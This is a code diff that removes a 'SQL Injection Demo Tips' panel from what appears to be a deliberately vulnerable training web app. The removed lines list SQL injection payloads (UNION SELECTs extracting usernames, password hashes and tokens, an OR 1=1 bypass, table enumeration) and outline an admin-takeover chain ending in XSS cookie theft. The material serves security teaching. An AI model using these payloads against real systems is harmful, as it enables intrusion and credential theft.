@@ -119,46 +119,7 @@
         }
     </script>
     {% endif %}
-    <div class="card" style="background-color: #fff3cd; border-left: 4px solid #ffc107;">
-        <h3>💡 SQL Injection Demo Tips</h3>
-        <p><strong>This page is vulnerable to SQL injection!</strong></p>
 
-        <h4>Example Attacks:</h4>
-
-        <h5>1. Extract User Information:</h5>
-        <pre
-            style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin, created_at FROM users--</pre>
-
-        <h5>2. View All Payments (bypass user restriction):</h5>
-        <pre style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 OR 1=1--</pre>
-
-        <h5>3. Extract Admin Credentials:</h5>
-        <pre
-            style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 UNION SELECT id, username, email, password_hash, 'Admin User', is_admin, created_at FROM users WHERE is_admin=1--</pre>
-
-        <h5>4. List All Tables:</h5>
-        <pre
-            style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 UNION SELECT 1,2,3,name,5,6,7 FROM sqlite_master WHERE type='table'--</pre>
-
-        <h5>5. Extract Session Tokens (if stored):</h5>
-        <pre
-            style="background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto;">?id=1 UNION SELECT id, username, email, 'token', full_name, is_admin, created_at FROM users--</pre>
-
-        <p style="margin-top: 15px; color: #856404;">
-            <strong>⚠️ Learning Point:</strong> Never use string formatting or concatenation with user input in SQL
-            queries.
-            Always use parameterized queries!
-        </p>
-
-        <h4 style="margin-top: 15px;">Attack Chain Demo:</h4>
-        <ol style="color: #856404;">
-            <li>Use SQLi to extract admin password hash</li>
-            <li>Crack the hash or use SQLi to create new admin user</li>
-            <li>Login as admin</li>
-            <li>Use XSS to steal other users' session cookies</li>
-            <li>Full system compromise!</li>
-        </ol>
-    </div>
 </div>
 
 <style>
